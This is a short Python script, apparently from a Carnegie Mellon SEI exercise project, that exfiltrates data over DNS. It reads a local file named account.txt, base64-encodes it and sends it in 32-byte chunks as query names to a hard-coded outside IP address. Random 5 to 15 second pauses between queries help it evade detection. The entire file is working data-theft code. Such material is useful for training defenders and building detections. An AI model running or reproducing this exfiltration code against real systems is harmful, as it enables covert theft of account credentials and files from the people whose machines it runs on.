
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import base64
import socket
import time
import random

# Define the DNS server and port to send queries to
dns_server = '45.79.150.151'
dns_port = 53

# Define the maximum number of bytes to send in each query
chunk_size = 32

# Open the input file
with open('/home/user/Downloads/account.txt', 'rb') as f:
    # Read the contents of the file
    file_contents = f.read()

# Encode the file contents as base64
encoded_contents = base64.b64encode(file_contents)

# Convert the base64-encoded contents to a string
encoded_string = encoded_contents.decode('ascii')

# Split the encoded string into chunks of the specified size
chunks = [encoded_string[i:i+chunk_size] for i in range(0, len(encoded_string), chunk_size)]

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send each chunk as a separate DNS query
for i, chunk in enumerate(chunks):
    # Construct the query name as BASE64STRING.legit.site
    query_name = chunk + '.legit.site'

    # Create the DNS query packet
    packet = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + query_name.encode('ascii') + b'\x00\x00\x01\x00\x01'

    # Send the DNS query packet to the server
    sock.sendto(packet, (dns_server, dns_port))
    
    # Sleep randomly between 5 and 15 seconds
    sleep_time = random.randint(5, 15)
    time.sleep(sleep_time)

